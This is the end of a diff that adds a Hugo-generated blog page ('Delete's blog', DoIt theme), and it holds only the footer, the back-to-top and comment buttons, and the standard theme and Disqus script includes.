+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
